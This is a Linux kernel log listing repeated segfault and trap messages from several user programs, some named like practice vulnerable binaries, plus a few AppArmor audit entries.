[3245055.984826] stairclimber[1045]: segfault at 7ffdd1199ff8 ip 00000000004020de sp 00007ffdd1199ff0 error 6 in stairclimber[400000+8000]
[3245056.162505] stairclimber[1049]: segfault at 7fff2c0c1ff8 ip 0000000000402b24 sp 00007fff2c0c1ff0 error 6 in stairclimber[400000+8000]
[3245056.334381] stairclimber[1054]: segfault at 7ffc9e6a3ff8 ip 0000000000402b24 sp 00007ffc9e6a3ff0 error 6 in stairclimber[400000+8000]
[3245132.595208] stairclimber[1103]: segfault at 7ffe52e80ff8 ip 0000000000402b24 sp 00007ffe52e80ff0 error 6 in stairclimber[400000+8000]
[3245132.763545] stairclimber[1107]: segfault at 7ffef515eff8 ip 00000000004020de sp 00007ffef515eff0 error 6 in stairclimber[400000+8000]
[3245132.922542] stairclimber[1111]: segfault at 7ffe634e1ff8 ip 0000000000403174 sp 00007ffe634e2000 error 6 in stairclimber[400000+8000]
[3245133.077605] stairclimber[1116]: segfault at 7ffd581a8ff8 ip 0000000000403174 sp 00007ffd581a9000 error 6 in stairclimber[400000+8000]
[3245133.196897] stairclimber[1120]: segfault at 7ffcd15fbff8 ip 00000000004020de sp 00007ffcd15fbff0 error 6 in stairclimber[400000+8000]
[3245133.362531] stairclimber[1124]: segfault at 7ffdb1e11ff8 ip 0000000000402b2f sp 00007ffdb1e12000 error 6 in stairclimber[400000+8000]
[3245186.658267] stairclimber[1163]: segfault at 7ffcdb72bff8 ip 0000000000401729 sp 00007ffcdb72c000 error 6 in stairclimber[400000+8000]
[3245186.824449] stairclimber[1168]: segfault at 7ffcb139aff8 ip 0000000000401b11 sp 00007ffcb139b000 error 6 in stairclimber[400000+8000]
[3245186.983557] stairclimber[1173]: segfault at 7ffe1f35aff8 ip 0000000000403174 sp 00007ffe1f35b000 error 6 in stairclimber[400000+8000]
[3245187.138044] stairclimber[1177]: segfault at 7ffce99a8ff8 ip 0000000000402b2f sp 00007ffce99a9000 error 6 in stairclimber[400000+8000]
[3245187.269107] stairclimber[1181]: segfault at 7fffe148aff8 ip 00000000004020de sp 00007fffe148aff0 error 6 in stairclimber[400000+8000]
[3245187.410272] stairclimber[1187]: segfault at 7ffcbe140ff8 ip 0000000000401729 sp 00007ffcbe141000 error 6 in stairclimber[400000+8000]
[3245231.994628] stairclimber[1230]: segfault at 7ffef2fb3ff8 ip 0000000000401727 sp 00007ffef2fb4000 error 6 in stairclimber[400000+8000]
[3245232.165168] stairclimber[1234]: segfault at 7ffc56e86ff8 ip 0000000000403172 sp 00007ffc56e87000 error 6 in stairclimber[400000+8000]
[3245232.341461] stairclimber[1238]: segfault at 7ffd31f78ff8 ip 00000000004020dc sp 00007ffd31f78ff0 error 6 in stairclimber[400000+8000]
[3245232.505036] stairclimber[1242]: segfault at 7ffc6c863ff8 ip 0000000000402b2d sp 00007ffc6c864000 error 6 in stairclimber[400000+8000]
[3245232.667391] stairclimber[1246]: segfault at 7ffc12cf9ff8 ip 0000000000402b2d sp 00007ffc12cfa000 error 6 in stairclimber[400000+8000]
[3245232.843528] stairclimber[1251]: segfault at 7fffd5c63ff8 ip 0000000000401b04 sp 00007fffd5c63ff0 error 6 in stairclimber[400000+8000]
[3299092.711276] vuln_prog1.bin[18668]: segfault at 7fffffffe0b0 ip 00007fffffffe0b0 sp 00007ffd6e6b8930 error 14
[3309654.190373] traps: text2bin[22905] general protection ip:4008b8 sp:7ffc818c0698 error:0 in text2bin[400000+1000]
[3316403.320605] traps: hello[25682] trap invalid opcode ip:4000b9 sp:7ffc7fd9e170 error:0 in hello[400000+1000]
[3316848.048272] traps: hello[25773] trap invalid opcode ip:4000c7 sp:7fff31807dd0 error:0 in hello[400000+1000]
[3317005.085324] traps: hello[25804] trap invalid opcode ip:4000c7 sp:7fff75b4c7b0 error:0 in hello[400000+1000]
[3317013.204674] traps: hello[25813] trap invalid opcode ip:4000c7 sp:7fff4ee34be0 error:0 in hello[400000+1000]
[3317141.833675] traps: hello[26097] trap invalid opcode ip:4000c7 sp:7ffdb016c650 error:0 in hello[400000+1000]
[3317219.611738] traps: hello[26133] trap invalid opcode ip:4000c6 sp:7ffe1c9bad80 error:0 in hello[400000+1000]
[3317322.452726] traps: hello[26158] trap invalid opcode ip:4000c6 sp:7fff6f83f2d0 error:0 in hello[400000+1000]
[3321210.825900] traps: hello[27780] trap invalid opcode ip:4000c7 sp:7fff38c8bac8 error:0 in hello[400000+1000]
[3321608.716099] traps: hello[27899] trap invalid opcode ip:4000c7 sp:7ffe145731f8 error:0 in hello[400000+1000]
[3358813.377839] audit: type=1400 audit(1538736500.706:16): apparmor="STATUS" operation="profile_replace" profile="unconfined" name="/sbin/dhclient" pid=6715 comm="apparmor_parser"
[3358813.378316] audit: type=1400 audit(1538736500.706:17): apparmor="STATUS" operation="profile_replace" profile="unconfined" name="/usr/lib/NetworkManager/nm-dhcp-client.action" pid=6715 comm="apparmor_parser"
[3358813.378749] audit: type=1400 audit(1538736500.706:18): apparmor="STATUS" operation="profile_replace" profile="unconfined" name="/usr/lib/NetworkManager/nm-dhcp-helper" pid=6715 comm="apparmor_parser"
[3358813.379374] audit: type=1400 audit(1538736500.710:19): apparmor="STATUS" operation="profile_replace" profile="unconfined" name="/usr/lib/connman/scripts/dhclient-script" pid=6715 comm="apparmor_parser"
[3358813.390175] audit: type=1400 audit(1538736500.718:20): apparmor="STATUS" operation="profile_replace" profile="unconfined" name="/usr/bin/lxc-start" pid=6718 comm="apparmor_parser"
[3358813.468863] audit: type=1400 audit(1538736500.798:21): apparmor="STATUS" operation="profile_replace" profile="unconfined" name="/usr/lib/lxd/lxd-bridge-proxy" pid=6720 comm="apparmor_parser"
[3358813.543563] audit: type=1400 audit(1538736500.874:22): apparmor="STATUS" operation="profile_replace" profile="unconfined" name="lxc-container-default" pid=6716 comm="apparmor_parser"
[3358813.544069] audit: type=1400 audit(1538736500.874:23): apparmor="STATUS" operation="profile_replace" profile="unconfined" name="lxc-container-default-cgns" pid=6716 comm="apparmor_parser"
[3358813.544575] audit: type=1400 audit(1538736500.874:24): apparmor="STATUS" operation="profile_replace" profile="unconfined" name="lxc-container-default-with-mounting" pid=6716 comm="apparmor_parser"
[3378934.216874] do_trap: 15 callbacks suppressed
[3378934.216882] traps: hello[12836] trap invalid opcode ip:4000c7 sp:7ffe0dbb4e68 error:0 in hello[400000+1000]
[3389979.902384] vuln_prog1.bin[16741]: segfault at 7fffffffc960 ip 00007fffffffc960 sp 00007fff83cdee30 error 14
[3390298.667014] traps: vuln_prog1.bin[16792] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3390384.537580] traps: vuln_prog1.bin[16839] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3390450.445997] traps: vuln_prog1.bin[16864] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3391037.840157] vuln_prog1.bin[17068]: segfault at 7fffffffc960 ip 00007fffffffc960 sp 00007ffc36fc0fd0 error 14
[3391779.705482] traps: hello[17500] trap invalid opcode ip:4000c7 sp:7ffc6964af28 error:0 in hello[400000+1000]
[3394563.311801] traps: vuln_prog1.bin[18179] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3394586.590155] traps: hello[18571] trap invalid opcode ip:4000c7 sp:7ffc2eab1b08 error:0 in hello[400000+1000]
[3395067.980130] vuln_prog1.bin[18828]: segfault at 5555555549a0 ip 00005555555549a0 sp 00007ffeac5406c0 error 14 in vuln_prog1.bin[555a6aadf000+1000]
[3395134.063832] traps: vuln_prog1.bin[18555] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3395523.961440] traps: vuln_prog1.bin[18906] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3395747.051634] traps: vuln_prog1.bin[19111] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3395911.283228] traps: vuln_prog1.bin[19159] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3395972.371043] traps: vuln_prog1.bin[19202] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3396837.898517] traps: vuln_prog1.bin[19335] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3397198.537003] traps: vuln_prog1.bin[19620] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3397383.340803] traps: vuln_prog1.bin[19679] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3398763.234347] vuln_prog1.bin[20249]: segfault at 555555554a86 ip 0000555555554a86 sp 00007ffd65aeb570 error 14 in vuln_prog1.bin[55c96609e000+1000]
[3399297.155085] traps: vuln_prog1.bin[20418] general protection ip:56499ac36a25 sp:7ffc036eba08 error:0 in vuln_prog1.bin[56499ac36000+1000]
[3399407.780808] vuln_prog1.bin[20453]: segfault at 555555554a86 ip 00005579e3d45a8b sp 00007ffd0f5fc800 error 4 in vuln_prog1.bin[5579e3d45000+1000]
[3400202.866222] traps: vuln_prog1.bin[20744] general protection ip:56141d41ca25 sp:7ffec1506e18 error:0 in vuln_prog1.bin[56141d41c000+1000]
[3402768.218210] traps: vuln_prog1.bin[21578] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3403010.162694] traps: vuln_prog1.bin[21640] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3403210.289357] traps: vuln_prog1.bin[21678] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3403227.809379] traps: vuln_prog1.bin[21685] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3404126.850375] traps: vuln_prog1.bin[21705] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3404927.561137] traps: vuln_prog1.bin[22423] general protection ip:555555554a25 sp:7fffffffd1a8 error:0 in vuln_prog1.bin[555555554000+1000]
[3404952.388649] traps: vuln_prog1.bin[22430] general protection ip:555555554a25 sp:7fffffffd1a8 error:0 in vuln_prog1.bin[555555554000+1000]
[3405076.367992] traps: vuln_prog1.bin[22469] general protection ip:555555554a25 sp:7fffffffd1a8 error:0 in vuln_prog1.bin[555555554000+1000]
[3406429.175858] traps: vuln_prog1.bin[22925] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3406603.681209] traps: vuln_prog1.bin[23003] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3406767.730434] traps: vuln_prog1.bin[23073] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3406925.863028] traps: vuln_prog1.bin[23106] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3407140.627362] traps: vuln_prog1.bin[23169] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3407218.558879] traps: vuln_prog1.bin[23210] trap stack segment ip:555555554aa2 sp:7fffffffc7d0 error:0 in vuln_prog1.bin[555555554000+1000]
[3407259.859595] traps: vuln_prog1.bin[23220] general protection ip:555555554a25 sp:7fffffffc7c8 error:0 in vuln_prog1.bin[555555554000+1000]
[3407433.795723] traps: vuln_prog1.bin[23399] trap stack segment ip:555555554aa2 sp:7fffffffc7d0 error:0 in vuln_prog1.bin[555555554000+1000]
[3408366.212411] vuln_prog1.bin[23641]: segfault at 5555555549a0 ip 00005555555549a0 sp 00007fffa8551170 error 14 in vuln_prog1.bin[558acd5df000+1000]
[3409493.852678] vuln_prog2.bin[24062]: segfault at 7fffff004141 ip 00007ffff7a5bcc0 sp 00007fffffffc250 error 4 in libc-2.23.so[7ffff7a0d000+1c0000]
[3413872.569483] traps: vuln_prog2.bin[25219] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3414171.927135] traps: vuln_prog2.bin[25320] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3414476.609376] traps: vuln_prog2.bin[25349] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3415519.547039] traps: vuln_prog2.bin[25703] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3415697.368514] traps: vuln_prog2.bin[25776] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3415786.784553] traps: vuln_prog2.bin[25814] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3417495.991531] traps: vuln_prog2.bin[26320] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3417610.436281] traps: vuln_prog2.bin[26343] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3417668.170386] traps: vuln_prog2.bin[26358] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3419677.642902] traps: vuln_prog2.bin[26955] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3420004.940616] traps: vuln_prog2.bin[27269] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3420481.633756] traps: vuln_prog2.bin[27295] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3420607.493047] traps: vuln_prog2.bin[27362] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3422339.152847] traps: vuln_prog2.bin[27886] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3423104.421346] traps: vuln_prog2.bin[27924] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3427844.650039] traps: vuln_prog2.bin[29381] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3431365.584939] traps: vuln_prog2.bin[30303] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3431988.727148] traps: vuln_prog2.bin[30375] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3433219.277420] traps: vuln_prog2.bin[30815] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3435705.323651] traps: vuln_prog2.bin[31511] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3435855.054328] traps: vuln_prog2.bin[31555] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3436333.967717] traps: vuln_prog2.bin[31588] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3437596.345151] traps: vuln_prog2.bin[32140] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3437993.231786] traps: vuln_prog2.bin[32227] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3438013.658611] traps: vuln_prog2.bin[32395] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3438030.446553] traps: vuln_prog2.bin[32405] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3438774.784579] traps: vuln_prog2.bin[32456] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3438904.879200] traps: vuln_prog2.bin[32570] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3438953.598894] traps: vuln_prog2.bin[32611] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3440601.851276] traps: vuln_prog2.bin[607] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3441366.186004] traps: vuln_prog2.bin[782] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3441787.612244] traps: vuln_prog2.bin[860] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3441975.749756] traps: vuln_prog2.bin[1103] general protection ip:7ffff7a5bcc0 sp:7fffffffc250 error:0 in libc-2.23.so[7ffff7a0d000+1c0000]
[3442203.625639] vuln_prog2.bin[1203]: segfault at 1 ip 00007ffff7a98746 sp 00007fffffffc9b8 error 4 in libc-2.23.so[7ffff7a0d000+1c0000]
[3666992.287959] vuln_prog1[32666]: segfault at 0 ip 00007f689decabf7 sp 00007ffc91a7c5e8 error 4 in libc-2.23.so[7f689de25000+1c0000]
[3667035.987839] vuln_prog1[32678]: segfault at 0 ip 00007face5330bf7 sp 00007ffd94567e88 error 4 in libc-2.23.so[7face528b000+1c0000]
[3815519.649556] vuln_prog1[11318]: segfault at 7f2e4e43000a ip 00007f2e4e0c3f49 sp 00007ffd26a80e80 error 6 in libc-2.23.so[7f2e4e077000+1c0000]
[3815737.427401] vuln_prog1[11369]: segfault at 7f1b000a0000 ip 00007f1bd98cebc6 sp 00007ffdaa9ddab0 error 6 in libc-2.23.so[7f1bd9882000+1c0000]
[3815756.149349] vuln_prog1[11374]: segfault at 7fe1000a0000 ip 00007fe1c56a0f49 sp 00007ffe200456e0 error 6 in libc-2.23.so[7fe1c5654000+1c0000]
[3912609.642522] strin[8143]: segfault at d ip 00007f68812a8cc0 sp 00007ffd6ade8000 error 4 in libc-2.23.so[7f688125a000+1c0000]
[4023963.687629] vuln_prog1[8375]: segfault at 7f9225296968 ip 00007f92252d8bc6 sp 00007ffc07d77660 error 7 in libc-2.23.so[7f922528c000+1c0000]
[4029201.551363] vuln_prog3[10066]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ffd6f400 error 14
[4029601.227929] vuln_prog3[10211]: segfault at f7e46da0 ip 00000000f7e46da0 sp 00000000ffd69ca0 error 14
[4035297.169141] vuln_prog1.bin[12590]: segfault at 5555555549a0 ip 00005555555549a0 sp 00007ffe7b1066b0 error 14 in vuln_prog1.bin[55808e578000+1000]
[4035935.619066] vuln_prog1.bin[12961]: segfault at 5555555549a0 ip 00005555555549a0 sp 00007ffd284ede30 error 14 in vuln_prog1.bin[556940fb5000+1000]
[4284379.971239] oocmerge[23614]: segfault at 0 ip 00007fc264a3c6f8 sp 00007ffe2418d980 error 4 in libc-2.23.so[7fc2649ce000+1c0000]
[4285237.299954] oocmerge[23871]: segfault at 0 ip 00007fda448716f8 sp 00007fff7f876f40 error 4 in libc-2.23.so[7fda44803000+1c0000]
[4334471.918732] oocmerge[6997]: segfault at 7ffc3b7fd008 ip 00007f869a1a4cc0 sp 00007ffc3b7fb120 error 4 in libc-2.23.so[7f869a156000+1c0000]
[4334577.921287] oocmerge[7019]: segfault at 7fff41c2200c ip 00007fa4a32dbcc0 sp 00007fff41c20250 error 4 in libc-2.23.so[7fa4a328d000+1c0000]
[4334670.873023] oocmerge[7049]: segfault at 7ffde5180008 ip 00007f0cb8bd5746 sp 00007ffde517ecf8 error 4 in libc-2.23.so[7f0cb8b4a000+1c0000]
[4334916.654318] oocmerge[7112]: segfault at 7ffe3d990010 ip 00007f3b57fe4746 sp 00007ffe3d98dd88 error 4 in libc-2.23.so[7f3b57f59000+1c0000]
[4335065.484361] oocmerge[7164]: segfault at 7ffe1fada004 ip 00007f476af49746 sp 00007ffe1fad8e48 error 4 in libc-2.23.so[7f476aebe000+1c0000]
[4335112.569847] oocmerge[7199]: segfault at 7ffd69dac008 ip 00007f70c484e746 sp 00007ffd69da9df8 error 4 in libc-2.23.so[7f70c47c3000+1c0000]
[4337633.399302] oocmerge[8404]: segfault at 7ffe3a43e868 ip 0000000000400aa9 sp 00007ffe3a43e870 error 6 in oocmerge[400000+1000]
[4346315.211087] oocmerge[11631]: segfault at 0 ip 00007fcafe128aee sp 00007ffe9268e1e0 error 4 in libc-2.23.so[7fcafe0bb000+1c0000]
[4346467.740465] oocmerge[11669]: segfault at 0 ip 00007f3d867dbaee sp 00007ffe7e9070a0 error 4 in libc-2.23.so[7f3d8676e000+1c0000]
[4346865.242154] oocmerge[11754]: segfault at 0 ip 00007f93463f8aee sp 00007ffef47ee380 error 4 in libc-2.23.so[7f934638b000+1c0000]
[4346958.354881] oocmerge[11917]: segfault at 0 ip 00007fd79a272aee sp 00007ffdda55d7c0 error 4 in libc-2.23.so[7fd79a205000+1c0000]
[4347324.488301] oocmerge[12015]: segfault at 0 ip 00007fa93e11daee sp 00007ffe3035a0d0 error 4 in libc-2.23.so[7fa93e0b0000+1c0000]
[4347432.906412] oocmerge[12042]: segfault at 0 ip 00007fa3b911eaee sp 00007ffe88398270 error 4 in libc-2.23.so[7fa3b90b1000+1c0000]
[4347609.834529] oocmerge[12078]: segfault at 0 ip 00007fe51f897aee sp 00007ffc7c2ccce0 error 4 in libc-2.23.so[7fe51f82a000+1c0000]
[4347630.576648] oocmerge[12089]: segfault at 0 ip 00007f5f396f2aee sp 00007ffe011466d0 error 4 in libc-2.23.so[7f5f39685000+1c0000]
[4347663.377548] oocmerge[12100]: segfault at 0 ip 00007f69d871baee sp 00007ffd961abc60 error 4 in libc-2.23.so[7f69d86ae000+1c0000]
[4347860.494917] oocmerge[12133]: segfault at 0 ip 00007ff5d60b5aee sp 00007ffced9c54e0 error 4 in libc-2.23.so[7ff5d6048000+1c0000]
[4347895.962229] oocmerge[12139]: segfault at 0 ip 00007f4ca3b45aee sp 00007ffcc683e270 error 4 in libc-2.23.so[7f4ca3ad8000+1c0000]
[4348099.985701] oocmerge[12259]: segfault at 0 ip 00007ffa156d1aee sp 00007fffc9a6be80 error 4 in libc-2.23.so[7ffa15664000+1c0000]
[4362702.427101] oocmerge[16397]: segfault at 0 ip 00007f951a08f6f8 sp 00007fffa9ad83f0 error 4 in libc-2.23.so[7f951a021000+1c0000]
[4362773.717108] oocmerge[16436]: segfault at 0 ip 00007f47185cc6f8 sp 00007ffd580b7c70 error 4 in libc-2.23.so[7f471855e000+1c0000]
[4362811.628074] oocmerge[16447]: segfault at 0 ip 00007ff06b7eb6f8 sp 00007fff5f379180 error 4 in libc-2.23.so[7ff06b77d000+1c0000]
[4362924.042009] oocmerge[16475]: segfault at 0 ip 00007f3aea24c6f8 sp 00007ffe54c64340 error 4 in libc-2.23.so[7f3aea1de000+1c0000]
[4363107.183649] oocmerge[16516]: segfault at 0 ip 00007f6ce54a06f8 sp 00007ffc6cf63050 error 4 in libc-2.23.so[7f6ce5432000+1c0000]
[4363158.620813] oocmerge[16536]: segfault at 0 ip 00007fee9c65c6f8 sp 00007fff67810cd0 error 4 in libc-2.23.so[7fee9c5ee000+1c0000]
[4363270.081005] oocmerge[16697]: segfault at 0 ip 00007fd08b1806f8 sp 00007ffc5dc8a480 error 4 in libc-2.23.so[7fd08b112000+1c0000]
[4363434.838417] oocmerge[16731]: segfault at 0 ip 00007f181c3776f8 sp 00007fffd1bf2fc0 error 4 in libc-2.23.so[7f181c309000+1c0000]
[4364207.163698] oocmerge[16924]: segfault at 0 ip 00007f99c97c76f8 sp 00007fffb0d2b090 error 4 in libc-2.23.so[7f99c9759000+1c0000]
[4507590.926901] victim[26966]: segfault at 80 ip 00007ffff7a5bcc0 sp 00007fffffffda50 error 4 in libc-2.23.so[7ffff7a0d000+1c0000]
[4507605.406646] victim[27043]: segfault at 80 ip 00007ffff7a5bcc0 sp 00007fffffffda50 error 4 in libc-2.23.so[7ffff7a0d000+1c0000]
[4507608.569455] victim[27047]: segfault at 80 ip 00007ffff7a5bcc0 sp 00007fffffffda50 error 4 in libc-2.23.so[7ffff7a0d000+1c0000]
[4537535.744279] vuln_prog2.bin[5161]: segfault at 0 ip 00007ff7ad729bf7 sp 00007fff0c6633e8 error 4 in libc-2.23.so[7ff7ad684000+1c0000]
[4540014.949009] vuln_prog2.bin[5962]: segfault at 0 ip 00007faac89d9bf7 sp 00007ffe5da874c8 error 4 in libc-2.23.so[7faac8934000+1c0000]
[4540034.395831] vuln_prog2.bin[5967]: segfault at 0 ip 00007fc52919abf7 sp 00007ffc59289138 error 4 in libc-2.23.so[7fc5290f5000+1c0000]
[4546176.386622] vuln_prog2.bin[8179]: segfault at 0 ip 00007fac91f6dbf7 sp 00007ffc3b8f1738 error 4 in libc-2.23.so[7fac91ec8000+1c0000]
[4546189.881478] vuln_prog2.bin[8183]: segfault at 0 ip 00007fec2fac2bf7 sp 00007ffc6e49cc58 error 4 in libc-2.23.so[7fec2fa1d000+1c0000]
[4557287.096076] waterjugpuzzle[13146]: segfault at 7ffcdb37ffe8 ip 00007f1bb45acd79 sp 00007ffcdb37ffe0 error 6 in libstdc++.so.6.0.21[7f1bb451e000+172000]
[4557287.245124] waterjugpuzzle[13150]: segfault at 7fff517f0ff8 ip 00007f20867c1bbc sp 00007fff517f0ff0 error 6 in libc-2.23.so[7f2086740000+1c0000]
[4557287.379876] waterjugpuzzle[13154]: segfault at 7fffd6288708 ip 000000000040218a sp 00007fffd62886e0 error 6 in waterjugpuzzle[400000+7000]
[4557287.566632] waterjugpuzzle[13158]: segfault at 7ffc28757c98 ip 000000000040218a sp 00007ffc28757c70 error 6 in waterjugpuzzle[400000+7000]
[4557287.743148] waterjugpuzzle[13162]: segfault at 7ffccdf81788 ip 000000000040218a sp 00007ffccdf81760 error 6 in waterjugpuzzle[400000+7000]
[4557287.914994] waterjugpuzzle[13166]: segfault at 7fff55298ab8 ip 000000000040218a sp 00007fff55298a90 error 6 in waterjugpuzzle[400000+7000]
[4557288.091701] waterjugpuzzle[13170]: segfault at 7ffe8477dab8 ip 000000000040218a sp 00007ffe8477da90 error 6 in waterjugpuzzle[400000+7000]
[4557288.270766] waterjugpuzzle[13174]: segfault at 7ffd0fd38558 ip 000000000040218a sp 00007ffd0fd38530 error 6 in waterjugpuzzle[400000+7000]
[4557288.440062] waterjugpuzzle[13178]: segfault at 7ffe4dcb6f68 ip 00007fc993ee9bbc sp 00007ffe4dcb6f60 error 6 in libc-2.23.so[7fc993e68000+1c0000]
[4558115.919408] show_signal_msg: 4 callbacks suppressed
[4558115.919416] waterjugpuzzle[14020]: segfault at ffffffffffffffd0 ip 0000000000404a64 sp 00007ffefcf84e10 error 5 in waterjugpuzzle[400000+8000]
[4587982.760357] vuln_prog2.bin[26234]: segfault at 0 ip 00007fb688a49bf7 sp 00007fff1d06f348 error 4 in libc-2.23.so[7fb6889a4000+1c0000]
[4609710.936495] waterjugpuzzle[6990]: segfault at 0 ip 0000000000402117 sp 00007ffec5334550 error 4 in waterjugpuzzle[400000+a000]
[4609711.078195] waterjugpuzzle[6995]: segfault at 0 ip 0000000000402117 sp 00007ffd8eb7b0f0 error 4 in waterjugpuzzle[400000+a000]
[4609711.207150] waterjugpuzzle[6999]: segfault at 0 ip 0000000000402117 sp 00007fff04efe0e0 error 4 in waterjugpuzzle[400000+a000]
[4609711.336573] waterjugpuzzle[7003]: segfault at 0 ip 0000000000402117 sp 00007ffce99c7cb0 error 4 in waterjugpuzzle[400000+a000]
[4609711.466884] waterjugpuzzle[7010]: segfault at 0 ip 0000000000402117 sp 00007ffd62338fc0 error 4 in waterjugpuzzle[400000+a000]
[4609711.590402] waterjugpuzzle[7014]: segfault at 0 ip 0000000000402117 sp 00007fff241f7f40 error 4 in waterjugpuzzle[400000+a000]
[4609711.717317] waterjugpuzzle[7018]: segfault at 1 ip 0000000000402117 sp 00007ffcafcc0200 error 4 in waterjugpuzzle[400000+a000]
[4609711.843893] waterjugpuzzle[7022]: segfault at 0 ip 0000000000402117 sp 00007fff9aa23540 error 4 in waterjugpuzzle[400000+a000]
[4609711.968458] waterjugpuzzle[7026]: segfault at 0 ip 0000000000402117 sp 00007ffe4f6a1b50 error 4 in waterjugpuzzle[400000+a000]
[4609712.093536] waterjugpuzzle[7030]: segfault at 0 ip 0000000000402117 sp 00007ffe9282d300 error 4 in waterjugpuzzle[400000+a000]
[4611560.889170] show_signal_msg: 2 callbacks suppressed
[4611560.889175] waterjugpuzzle[8364]: segfault at 19 ip 00007f29bc7f5512 sp 00007ffcee3dcb70 error 4 in libc-2.23.so[7f29bc771000+1c0000]
[4611561.010783] waterjugpuzzle[8368]: segfault at 39 ip 00007f487586a512 sp 00007ffee5d03ff0 error 4 in libc-2.23.so[7f48757e6000+1c0000]
